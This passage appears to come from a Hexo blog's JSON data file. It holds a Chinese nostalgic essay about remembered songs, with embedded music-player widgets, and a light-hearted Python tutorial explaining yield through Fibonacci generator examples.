\n\n汪苏泷、徐良和许嵩。好多人为了凸显自己的音乐品味对他们嗤之以鼻。\n\n现在喊麦的mc们也被骂的很惨，我不觉得自己多有品位。\n\n讨厌的东西我不会去听，也不会去关注相关的任何讯息，我不喜欢你，所以我的世界里没有你，很简单。\n\n当初他们三位的歌曲陪伴我度过了一个又一个周末，一个又一个朝阳到余晖。\n\n现在再听起他们的歌，不会像当初那么陶醉，也没有青涩时期的画面扑面而来，情绪也不会跟着歌曲进入副歌而忽起波澜。\n\n像评论里说的：“现在听没有那时的感觉了。真的是回不去了[心碎]。”\n\n我始终觉得，让你困在过去的歌曲，不是你应该听的歌。\n\n我在听的，多半是这段回不去的路，和这路上的每一步吧。\n\n\n<script type=\"text/javascript\" src=\"http://www.xiami.com/widget/player-single?uid=0&sid=380252&mode=js\"></script>\n\n梁静茹的歌总是会让你体会到那种纯粹的感情\n\n“我可以假装看不见，也可以偷偷的想念”\n\n“知了也睡了，安心的睡了” \n\n那时的我们，向往着这种连空气都会变得很轻松的感情。\n\n当初单纯，幸运的是，我们嘴边哼着的歌，还要更单纯。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=28191530&auto=0&height=66\"></iframe>\n\n当年被胡彦斌这骚气的声线与唱法镇住了，听了一次想忘都难。\n\n当初有一个可以打电话点歌、点视频的互动电视频道，视频平均4分钟左右一段，2元点一次。\n\n在没人点播的时候，为了怕观众无聊，放的就是这首胡彦斌的歌，当下俗称的BMG就是它了。\n\n如果你想看一集动画片，你可能要点4-5次才能看完一集。\n\n想想当初挺有意思的，每天守着这个台，有一集没一集的跟着点播的土豪瞎看。\n\n有时看一集动画可能会被插播进来七八次歌曲MV，时间成本也蛮高的。\n\n守着电视的小伙伴们也慢慢的有了默契，只要你点了动画片的第一part，总会有其他小伙伴帮你点完。\n\n众筹的思想在小朋友的身上已经生根发芽了。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=69827&auto=0&height=66\"></iframe>\n\n那时我还听不懂。\n\n现在想想：\n\n“太多的借口”\n\n“太多的理由”\n\n“为了爱情我也背叛了所有”\n\n“如果你想离开我”\n\n“就别再畏畏缩缩”\n\n乍一听，是一个痴情人被爱情折磨的终于不想承受的故事。\n\n可是仔细想想，如果真想离开你，还会找借口和理由吗？\n\n既已不再留恋，何必处处遮掩？\n\n你含泪看着对方的时候，又怎知对方不是在含泪望着你。\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=307525&auto=0&height=66\"></iframe>  \n\n悄悄地喜欢一个人\n\n把握的恰到好处\n\n刚好瞒着他的同时，被全世界看穿了自己\n\n在那个人身上用尽了我们能表达出来的所有情绪\n\n把每一个电视剧里的故事都在脑海中排练了一遍\n\n一个不经意的动作，一句很自然的话\n\n能让自己对着自己在脑海中低语很久\n\n思绪随着天色浅浅有了光亮\n\n才叹着气睡去\n\n其实，我们只是刚好在那个时候\n\n需要完全陌生的人\n\n来感动自己\n\n不是我们做了那么多，最后却只感动了自己\n\n而是我们所做的一切，都只是为了感动自己","slug":"sgbtLC","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8e000lmkwblt8w64co","content":"<blockquote>\n<p>他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。</p>\n</blockquote>\n<p><img src=\"/Image/walk_away.jpg\" alt=\"walk_away\"></p>\n<a id=\"more\"></a>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=277722&auto=0&height=66\"></iframe>\n\n<p>蛮喜欢下雨天，小时候总是疯疯癫癫的跑出去淋雨。  </p>\n<p>长大了，一个人的时候总会望着窗外的雨出神，有时会想着谁，有时不知道该想想谁。</p>\n<p>一旦发生过这样的事情，便很难在下雨天抑制住自己的思绪。</p>\n<p>有时会想让自己不去想，那种空灵的感觉总是让人没办法拒绝又会浪费掉精力和时间。</p>\n<p>印象中克制的最好的一次大概是听着吵吵的音乐，在雨中阴沉着脸赶路吧。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=165364&auto=0&height=66\"></iframe> \n\n<p>汪苏泷、徐良和许嵩。好多人为了凸显自己的音乐品味对他们嗤之以鼻。</p>\n<p>现在喊麦的mc们也被骂的很惨，我不觉得自己多有品位。</p>\n<p>讨厌的东西我不会去听，也不会去关注相关的任何讯息，我不喜欢你，所以我的世界里没有你，很简单。</p>\n<p>当初他们三位的歌曲陪伴我度过了一个又一个周末，一个又一个朝阳到余晖。</p>\n<p>现在再听起他们的歌，不会像当初那么陶醉，也没有青涩时期的画面扑面而来，情绪也不会跟着歌曲进入副歌而忽起波澜。</p>\n<p>像评论里说的：“现在听没有那时的感觉了。真的是回不去了[心碎]。”</p>\n<p>我始终觉得，让你困在过去的歌曲，不是你应该听的歌。</p>\n<p>我在听的，多半是这段回不去的路，和这路上的每一步吧。</p>\n<script type=\"text/javascript\" src=\"http://www.xiami.com/widget/player-single?uid=0&sid=380252&mode=js\"></script>\n\n<p>梁静茹的歌总是会让你体会到那种纯粹的感情</p>\n<p>“我可以假装看不见，也可以偷偷的想念”</p>\n<p>“知了也睡了，安心的睡了” </p>\n<p>那时的我们，向往着这种连空气都会变得很轻松的感情。</p>\n<p>当初单纯，幸运的是，我们嘴边哼着的歌，还要更单纯。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=28191530&auto=0&height=66\"></iframe>\n\n<p>当年被胡彦斌这骚气的声线与唱法镇住了，听了一次想忘都难。</p>\n<p>当初有一个可以打电话点歌、点视频的互动电视频道，视频平均4分钟左右一段，2元点一次。</p>\n<p>在没人点播的时候，为了怕观众无聊，放的就是这首胡彦斌的歌，当下俗称的BMG就是它了。</p>\n<p>如果你想看一集动画片，你可能要点4-5次才能看完一集。</p>\n<p>想想当初挺有意思的，每天守着这个台，有一集没一集的跟着点播的土豪瞎看。</p>\n<p>有时看一集动画可能会被插播进来七八次歌曲MV，时间成本也蛮高的。</p>\n<p>守着电视的小伙伴们也慢慢的有了默契，只要你点了动画片的第一part，总会有其他小伙伴帮你点完。</p>\n<p>众筹的思想在小朋友的身上已经生根发芽了。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=69827&auto=0&height=66\"></iframe>\n\n<p>那时我还听不懂。</p>\n<p>现在想想：</p>\n<p>“太多的借口”</p>\n<p>“太多的理由”</p>\n<p>“为了爱情我也背叛了所有”</p>\n<p>“如果你想离开我”</p>\n<p>“就别再畏畏缩缩”</p>\n<p>乍一听，是一个痴情人被爱情折磨的终于不想承受的故事。</p>\n<p>可是仔细想想，如果真想离开你，还会找借口和理由吗？</p>\n<p>既已不再留恋，何必处处遮掩？</p>\n<p>你含泪看着对方的时候，又怎知对方不是在含泪望着你。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=307525&auto=0&height=66\"></iframe>  \n\n<p>悄悄地喜欢一个人</p>\n<p>把握的恰到好处</p>\n<p>刚好瞒着他的同时，被全世界看穿了自己</p>\n<p>在那个人身上用尽了我们能表达出来的所有情绪</p>\n<p>把每一个电视剧里的故事都在脑海中排练了一遍</p>\n<p>一个不经意的动作，一句很自然的话</p>\n<p>能让自己对着自己在脑海中低语很久</p>\n<p>思绪随着天色浅浅有了光亮</p>\n<p>才叹着气睡去</p>\n<p>其实，我们只是刚好在那个时候</p>\n<p>需要完全陌生的人</p>\n<p>来感动自己</p>\n<p>不是我们做了那么多，最后却只感动了自己</p>\n<p>而是我们所做的一切，都只是为了感动自己</p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。</p>\n</blockquote>\n<p><img src=\"/Image/walk_away.jpg\" alt=\"walk_away\"></p>","more":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=277722&auto=0&height=66\"></iframe>\n\n<p>蛮喜欢下雨天，小时候总是疯疯癫癫的跑出去淋雨。  </p>\n<p>长大了，一个人的时候总会望着窗外的雨出神，有时会想着谁，有时不知道该想想谁。</p>\n<p>一旦发生过这样的事情，便很难在下雨天抑制住自己的思绪。</p>\n<p>有时会想让自己不去想，那种空灵的感觉总是让人没办法拒绝又会浪费掉精力和时间。</p>\n<p>印象中克制的最好的一次大概是听着吵吵的音乐，在雨中阴沉着脸赶路吧。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=165364&auto=0&height=66\"></iframe> \n\n<p>汪苏泷、徐良和许嵩。好多人为了凸显自己的音乐品味对他们嗤之以鼻。</p>\n<p>现在喊麦的mc们也被骂的很惨，我不觉得自己多有品位。</p>\n<p>讨厌的东西我不会去听，也不会去关注相关的任何讯息，我不喜欢你，所以我的世界里没有你，很简单。</p>\n<p>当初他们三位的歌曲陪伴我度过了一个又一个周末，一个又一个朝阳到余晖。</p>\n<p>现在再听起他们的歌，不会像当初那么陶醉，也没有青涩时期的画面扑面而来，情绪也不会跟着歌曲进入副歌而忽起波澜。</p>\n<p>像评论里说的：“现在听没有那时的感觉了。真的是回不去了[心碎]。”</p>\n<p>我始终觉得，让你困在过去的歌曲，不是你应该听的歌。</p>\n<p>我在听的，多半是这段回不去的路，和这路上的每一步吧。</p>\n<script type=\"text/javascript\" src=\"http://www.xiami.com/widget/player-single?uid=0&sid=380252&mode=js\"></script>\n\n<p>梁静茹的歌总是会让你体会到那种纯粹的感情</p>\n<p>“我可以假装看不见，也可以偷偷的想念”</p>\n<p>“知了也睡了，安心的睡了” </p>\n<p>那时的我们，向往着这种连空气都会变得很轻松的感情。</p>\n<p>当初单纯，幸运的是，我们嘴边哼着的歌，还要更单纯。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=28191530&auto=0&height=66\"></iframe>\n\n<p>当年被胡彦斌这骚气的声线与唱法镇住了，听了一次想忘都难。</p>\n<p>当初有一个可以打电话点歌、点视频的互动电视频道，视频平均4分钟左右一段，2元点一次。</p>\n<p>在没人点播的时候，为了怕观众无聊，放的就是这首胡彦斌的歌，当下俗称的BMG就是它了。</p>\n<p>如果你想看一集动画片，你可能要点4-5次才能看完一集。</p>\n<p>想想当初挺有意思的，每天守着这个台，有一集没一集的跟着点播的土豪瞎看。</p>\n<p>有时看一集动画可能会被插播进来七八次歌曲MV，时间成本也蛮高的。</p>\n<p>守着电视的小伙伴们也慢慢的有了默契，只要你点了动画片的第一part，总会有其他小伙伴帮你点完。</p>\n<p>众筹的思想在小朋友的身上已经生根发芽了。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=69827&auto=0&height=66\"></iframe>\n\n<p>那时我还听不懂。</p>\n<p>现在想想：</p>\n<p>“太多的借口”</p>\n<p>“太多的理由”</p>\n<p>“为了爱情我也背叛了所有”</p>\n<p>“如果你想离开我”</p>\n<p>“就别再畏畏缩缩”</p>\n<p>乍一听，是一个痴情人被爱情折磨的终于不想承受的故事。</p>\n<p>可是仔细想想，如果真想离开你，还会找借口和理由吗？</p>\n<p>既已不再留恋，何必处处遮掩？</p>\n<p>你含泪看着对方的时候，又怎知对方不是在含泪望着你。</p>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=307525&auto=0&height=66\"></iframe>  \n\n<p>悄悄地喜欢一个人</p>\n<p>把握的恰到好处</p>\n<p>刚好瞒着他的同时，被全世界看穿了自己</p>\n<p>在那个人身上用尽了我们能表达出来的所有情绪</p>\n<p>把每一个电视剧里的故事都在脑海中排练了一遍</p>\n<p>一个不经意的动作，一句很自然的话</p>\n<p>能让自己对着自己在脑海中低语很久</p>\n<p>思绪随着天色浅浅有了光亮</p>\n<p>才叹着气睡去</p>\n<p>其实，我们只是刚好在那个时候</p>\n<p>需要完全陌生的人</p>\n<p>来感动自己</p>\n<p>不是我们做了那么多，最后却只感动了自己</p>\n<p>而是我们所做的一切，都只是为了感动自己</p>"},{"title":"你需要一个老头，帮助你理解下 Python 中的 yield","date":"2016-12-14T08:01:01.000Z","layout":"post","comments":1,"reward":true,"_content":"\n> **题外话**\n> * 最初接触 Python 这门语言的时候，看的是《Python 核心编程》 迷迷糊糊的把 `yield` 这里看过去了，知道这个东西是用来造一个`生成器`用的，就一带而过了，日后的搬砖过程中也不知道怎么用这个家伙事儿。\n> * 我比较笨，学东西讨厌文档型说明（看不懂QAQ）。所以总是自己花很长时间去加工适合我的食物。\n> * <iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=33211676&auto=0&height=66\"></iframe>\n\n----------\n\n### 说起 `yield`，那这到底是个什么玩意？\n\n准备好了，我要开始背课文了：\n……\n<!--more-->\n从小脑袋不好使，记不住……\n还是编故事吧：\n\n有个叫斐波那契的老头（也可能是女的，跟我有什么关系），提出了一个（不明白他搞出这东西要干啥的）数列定义（斐波那契数列）：\n> 有一串数字，前两个是1，从第三个开始，每个数字都是它前两位数字的和。（1, 1, 2, 3, 5, 8, 13……）\n\n提出定义的人我可以理解为他无聊，但是后来一群抠脚大汉开始对第N个数是多少那么感兴趣是什么鬼？这玩意算出来能干啥？（不知道）\n\n不行，我也要凑热闹。（koujiao……）\n\n```python\ndef fab(max):\n    n, a, b = 0, 0, 1\n    while n < max:\n        print b\n        a, b = b, a + b\n        n = n + 1\n```\n好，跑一下试试。\n```python\n>>> fab(5)\n1\n1\n2\n3\n5\n```\n结果是对的，你以为这就完了？\n隔壁王叔叔表示小伙子你这个写的有点问题啊，你这个直接`print`出来的，只能给我看，不能让我直接拿来用啊（你用它能干嘛？[手动黑人问号]）\n好，那就听您老的，给你返回一个 List 让你用（？？？）。\n```python\ndef fab(max):\n    n, a, b = 0, 0, 1\n    list = []\n    while n < max:\n        list.append(b)\n        a, b = b, a + b\n        n = n + 1\n    return list\n```\n来，试一下。\n```python\n>>> for n in fab(5):\n...     print n\n...\n1\n1\n2\n3\n5\n```\n隔壁王叔叔的丈母娘（跟直系亲属姥姥不是一个人，谢谢)表示，小伙子你这个程序太特么占内存了，我输入大一点，这个List占用的内存都够我玩刺客信条大革命了（excuse me??)。\n\n### 性能优化\n\n如果对python有一些了解的话，我们能很自然的想到一个经常拿来装逼的东西`xrange`。\n```python\n# 1\nfor i in range(1000): \n    pass\n\n# 2\nfor i in xrange(1000):\n    pass\n```\n上面的两种写法，第一种是直接生成 1000个元素的List，相当于一次性给你一年的生活费。 而第二种是每次循环用到的时候给你一个，再用到再给你一个，可以理解为他有一个算式，每次你找他要钱他都要当场算算，然后给你一天的生活费。那用第二种方法吧。（看起来很扣的样子）\n\n好，实现一个。\n```python\nclass Fab(object):\n    \n    def __init__(self, max):\n        self.max = max\n        self.n, self.a, self.b = 0, 0, 1\n        \n    def __iter__(self):\n        return self\n        \n    def next(self):\n        if self.n < self.max:\n            r = self.b\n            self.a, self.b = self.b, self.a + self.b\n            self.n = self.n + 1\n            return r\n        raise StopIteration()\n```\n基础差的看不懂的，其实上面的代码就是定义了一个算法，你每次问我要一个数，我就当场算一个数，不会像上一个版本直接返回给你一个List。\n我们来调用一下：\n```python\n>>> for n in Fab(5):\n...     print n\n...\n1\n1\n2\n3\n5\n```\n嗯，成功了，这个版本性能是有了，可是隔壁王叔叔的侄女看了看代码不愿意了，帅哥（为什么要说出来？）你这个程序看着太复杂了啊，本来那么简单的代码怎么写的这么复杂啊？你这个人好复杂啊。\n\n很好小姑娘，你要是王叔叔，我特么把你家网线煮了。看在你说的挺有道理的份上（其实是长得好看），我看看能不能简单点。\n\n来，我们用一种高逼格的东西，兼顾简洁与性能，嘤嘤嘤。\n```python\ndef fab(max):\n    n, a, b = 0, 0, 1\n    while n < max:\n        yield b\n        # print b\n        a, b = b, a + b\n        n = n + 1\n```\n跟最初的第一个版本很像，注释掉了`print b`这句话，加上了 `yield b`。这里我们先调用下，看看结果。\n```python\n>>> for n in fab(5):\n...     print n\n...\n1\n1\n2\n3\n5\n```\n### 吹牛B模式已开启\nok, 现在来回想下我们一路走过来，从最初的版本到使用`yield`之前，经历了哪些改动？\n仔细对照第一次的例子和这个使用`yield`的例子，好像差不多？再看看我们测试结果的代码有什么不同。\n就是这里了\n```python\n# 第一个例子\nfab(5)\n\n# yield例子\nfor n in fab(5)\n    print n\n```\n发现问题了吗？\n> * fab(max) 函数中同样使用循环\n> * 一个使用 yield，另一个使用 print 打印\n> * yield 例子，需要自己循环调用才能一个一个打印出来\n\n这里我们推测`yield`使用上的特点：\n> * 暂停函数运行（要循环调用才管用）\n> * 再次调用能从上次暂停的地方继续执行函数（数列是连续的）\n> * 函数的每次运行都是遇到 yield 就停止并返回迭代值，下次再用时继续\n> * 对不起我编不下去了\n\n据说还有更强大的使用方式，下次有机会研究研究写个续吧：）\n\n----------\n**隔壁王叔叔的儿子的小姨子表示小伙子，你再努努力，我就跟你跑了。**\n\n例子取自：[廖雪峰-Python yield使用浅析](http://www.liaoxuefeng.com/article/001373892916170b88313a39f294309970ad53fc6851243000)","source":"_posts/python_yield1.md","raw":"---\ntitle: 你需要一个老头，帮助你理解下 Python 中的 yield\ndate: 2016-12-14 16:01:01\nlayout: post\ncomments: true\nreward: true\ntags:\n    - python\n\n---\n\n> **题外话**\n> * 最初接触 Python 这门语言的时候，看的是《Python 核心编程》 迷迷糊糊的把 `yield` 这里看过去了，知道这个东西是用来造一个`生成器`用的，就一带而过了，日后的搬砖过程中也不知道怎么用这个家伙事儿。\n> * 我比较笨，学东西讨厌文档型说明（看不懂QAQ）。所以总是自己花很长时间去加工适合我的食物。\n> * <iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=33211676&auto=0&height=66\"></iframe>\n\n----------\n\n### 说起 `yield`，那这到底是个什么玩意？\n\n准备好了，我要开始背课文了：\n……\n<!--more-->\n从小脑袋不好使，记不住……\n还是编故事吧：\n\n有个叫斐波那契的老头（也可能是女的，跟我有什么关系），提出了一个（不明白他搞出这东西要干啥的）数列定义（斐波那契数列）：\n> 有一串数字，前两个是1，从第三个开始，每个数字都是它前两位数字的和。（1, 1, 2, 3, 5, 8, 13……）\n\n提出定义的人我可以理解为他无聊，但是后来一群抠脚大汉开始对第N个数是多少那么感兴趣是什么鬼？这玩意算出来能干啥？（不知道）\n\n不行，我也要凑热闹。（koujiao……）\n\n```python\ndef fab(max):\n    n, a, b = 0, 0, 1\n    while n < max:\n        print b\n        a, b = b, a + b\n        n = n + 1\n```\n好，跑一下试试。\n```python\n>>> fab(5)\n1\n1\n2\n3\n5\n```\n结果是对的，你以为这就完了？\n隔壁王叔叔表示小伙子你这个写的有点问题啊，你这个直接`print`出来的，只能给我看，不能让我直接拿来用啊（你用它能干嘛？[手动黑人问号]）\n好，那就听您老的，给你返回一个 List 让你用（？？？）。\n```python\ndef fab(max):\n    n, a, b = 0, 0, 1\n    list = []\n    while n < max:\n        list.append(b)\n        a, b = b, a + b\n        n = n + 1\n    return list\n```\n来，试一下。\n```python\n>>> for n in fab(5):\n...     print n\n...\n1\n1\n2\n3\n5\n```\n隔壁王叔叔的丈母娘（跟直系亲属姥姥不是一个人，谢谢)表示，小伙子你这个程序太特么占内存了，我输入大一点，这个List占用的内存都够我玩刺客信条大革命了（excuse me??)。\n\n### 性能优化\n\n如果对python有一些了解的话，我们能很自然的想到一个经常拿来装逼的东西`xrange`。\n```python\n# 1\nfor i in range(1000): \n    pass\n\n# 2\nfor i in xrange(1000):\n    pass\n```\n上面的两种写法，第一种是直接生成 1000个元素的List，相当于一次性给你一年的生活费。 而第二种是每次循环用到的时候给你一个，再用到再给你一个，可以理解为他有一个算式，每次你找他要钱他都要当场算算，然后给你一天的生活费。那用第二种方法吧。（看起来很扣的样子）\n\n好，实现一个。\n```python\nclass Fab(object):\n    \n    def __init__(self, max):\n        self.max = max\n        self.n, self.a, self.b = 0, 0, 1\n        \n    def __iter__(self):\n        return self\n        \n    def next(self):\n        if self.n < self.max:\n            r = self.b\n            self.a, self.b = self.b, self.a + self.b\n            self.n = self.n + 1\n            return r\n        raise StopIteration()\n```\n基础差的看不懂的，其实上面的代码就是定义了一个算法，你每次问我要一个数，我就当场算一个数，不会像上一个版本直接返回给你一个List。\n我们来调用一下：\n```python\n>>> for n in Fab(5):\n...     print n\n...\n1\n1\n2\n3\n5\n```\n嗯，成功了，这个版本性能是有了，可是隔壁王叔叔的侄女看了看代码不愿意了，帅哥（为什么要说出来？）你这个程序看着太复杂了啊，本来那么简单的代码怎么写的这么复杂啊？你这个人好复杂啊。\n\n很好小姑娘，你要是王叔叔，我特么把你家网线煮了。看在你说的挺有道理的份上（其实是长得好看），我看看能不能简单点。\n\n来，我们用一种高逼格的东西，兼顾简洁与性能，嘤嘤嘤。\n```python\ndef fab(max):\n    n, a, b = 0, 0, 1\n    while n < max:\n        yield b\n        # print b\n        a, b = b, a + b\n        n = n + 1\n```\n跟最初的第一个版本很像，注释掉了`print b`这句话，加上了 `yield b`。这里我们先调用下，看看结果。\n```python\n>>> for n in fab(5):\n...     print n\n...\n1\n1\n2\n3\n5\n```\n### 吹牛B模式已开启\nok, 现在来回想下我们一路走过来，从最初的版本到使用`yield`之前，经历了哪些改动？\n仔细对照第一次的例子和这个使用`yield`的例子，好像差不多？再看看我们测试结果的代码有什么不同。\n就是这里了\n```python\n# 第一个例子\nfab(5)\n\n# yield例子\nfor n in fab(5)\n    print n\n```\n发现问题了吗？\n> * fab(max) 函数中同样使用循环\n> * 一个使用 yield，另一个使用 print 打印\n> * yield 例子，需要自己循环调用才能一个一个打印出来\n\n这里我们推测`yield`使用上的特点：\n> * 暂停函数运行（要循环调用才管用）\n> * 再次调用能从上次暂停的地方继续执行函数（数列是连续的）\n> * 函数的每次运行都是遇到 yield 就停止并返回迭代值，下次再用时继续\n> * 对不起我编不下去了\n\n据说还有更强大的使用方式，下次有机会研究研究写个续吧：）\n\n----------\n**隔壁王叔叔的儿子的小姨子表示小伙子，你再努努力，我就跟你跑了。**\n\n例子取自：[廖雪峰-Python yield使用浅析](http://www.liaoxuefeng.com/article/001373892916170b88313a39f294309970ad53fc6851243000)","slug":"python_yield1","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8f000nmkwbgludv8p2","content":"<blockquote>\n<p><strong>题外话</strong></p>\n<ul>\n<li>最初接触 Python 这门语言的时候，看的是《Python 核心编程》 迷迷糊糊的把 <code>yield</code> 这里看过去了，知道这个东西是用来造一个<code>生成器</code>用的，就一带而过了，日后的搬砖过程中也不知道怎么用这个家伙事儿。</li>\n<li>我比较笨，学东西讨厌文档型说明（看不懂QAQ）。所以总是自己花很长时间去加工适合我的食物。</li>\n<li><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=33211676&auto=0&height=66\"></iframe>\n\n</li>\n</ul>\n</blockquote>\n<hr>\n<h3 id=\"说起-yield，那这到底是个什么玩意？\"><a href=\"#说起-yield，那这到底是个什么玩意？\" class=\"headerlink\" title=\"说起 yield，那这到底是个什么玩意？\"></a>说起 <code>yield</code>，那这到底是个什么玩意？</h3><p>准备好了，我要开始背课文了：<br>……<br><a id=\"more\"></a><br>从小脑袋不好使，记不住……<br>还是编故事吧：</p>\n<p>有个叫斐波那契的老头（也可能是女的，跟我有什么关系），提出了一个（不明白他搞出这东西要干啥的）数列定义（斐波那契数列）：</p>\n<blockquote>\n<p>有一串数字，前两个是1，从第三个开始，每个数字都是它前两位数字的和。（1, 1, 2, 3, 5, 8, 13……）</p>\n</blockquote>\n<p>提出定义的人我可以理解为他无聊，但是后来一群抠脚大汉开始对第N个数是多少那么感兴趣是什么鬼？这玩意算出来能干啥？（不知道）</p>\n<p>不行，我也要凑热闹。（koujiao……）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fab</span><span class=\"params\">(max)</span>:</span></div><div class=\"line\">    n, a, b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">while</span> n &lt; max:</div><div class=\"line\">        <span class=\"keyword\">print</span> b</div><div class=\"line\">        a, b = b, a + b</div><div class=\"line\">        n = n + <span class=\"number\">1</span></div></pre></td></tr></table></figure>\n<p>好，跑一下试试。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>fab(<span class=\"number\">5</span>)</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<p>结果是对的，你以为这就完了？<br>隔壁王叔叔表示小伙子你这个写的有点问题啊，你这个直接<code>print</code>出来的，只能给我看，不能让我直接拿来用啊（你用它能干嘛？[手动黑人问号]）<br>好，那就听您老的，给你返回一个 List 让你用（？？？）。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fab</span><span class=\"params\">(max)</span>:</span></div><div class=\"line\">    n, a, b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">    list = []</div><div class=\"line\">    <span class=\"keyword\">while</span> n &lt; max:</div><div class=\"line\">        list.append(b)</div><div class=\"line\">        a, b = b, a + b</div><div class=\"line\">        n = n + <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">return</span> list</div></pre></td></tr></table></figure></p>\n<p>来，试一下。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> fab(<span class=\"number\">5</span>):</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">print</span> n</div><div class=\"line\">...</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<p>隔壁王叔叔的丈母娘（跟直系亲属姥姥不是一个人，谢谢)表示，小伙子你这个程序太特么占内存了，我输入大一点，这个List占用的内存都够我玩刺客信条大革命了（excuse me??)。</p>\n<h3 id=\"性能优化\"><a href=\"#性能优化\" class=\"headerlink\" title=\"性能优化\"></a>性能优化</h3><p>如果对python有一些了解的话，我们能很自然的想到一个经常拿来装逼的东西<code>xrange</code>。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 1</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1000</span>): </div><div class=\"line\">    <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 2</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">1000</span>):</div><div class=\"line\">    <span class=\"keyword\">pass</span></div></pre></td></tr></table></figure></p>\n<p>上面的两种写法，第一种是直接生成 1000个元素的List，相当于一次性给你一年的生活费。 